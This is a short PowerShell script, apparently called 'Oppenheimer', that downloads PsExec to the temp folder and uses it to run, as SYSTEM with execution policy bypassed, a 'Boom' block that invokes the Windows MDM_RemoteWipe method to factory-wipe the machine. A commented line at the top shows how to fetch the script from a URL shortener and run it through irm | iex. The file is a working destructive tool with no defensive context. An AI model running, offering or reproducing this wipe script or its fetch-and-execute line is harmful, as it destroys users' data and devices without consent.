#irm "https://tinyurl.com/OppenBoom" | iex

$ProgressPreference = 'SilentlyContinue'
$Filename = "PsExec64.exe"
$WebClient = New-Object System.Net.WebClient 
$URL = 'https://github.com/Tachaeon/Oppenheimer/raw/refs/heads/main/PsExec64.exe'
$File = "$env:TEMP\$Filename" 
$WebClient.DownloadFile($URL, $File)

$Boom = {
    $namespaceName = "root\cimv2\mdm\dmmap"
    $className = "MDM_RemoteWipe"
    $methodName = "doWipeMethod"
    
    $session = New-CimSession
    
    $params = New-Object Microsoft.Management.Infrastructure.CimMethodParametersCollection
    $param = [Microsoft.Management.Infrastructure.CimMethodParameter]::Create("param", "", "String", "In")
    $params.Add($param)
    
    $instance = Get-CimInstance -Namespace $namespaceName -ClassName $className -Filter "ParentID='./Vendor/MSFT' and InstanceID='RemoteWipe'"
    $session.InvokeMethod($namespaceName, $instance, $methodName, $params)
}

$BoomFile = "$env:TEMP\Boom.ps1"
$Boom | Out-File -FilePath $BoomFile

& $File -s -accepteula -nobanner powershell.exe -ExecutionPolicy Bypass -File $BoomFile
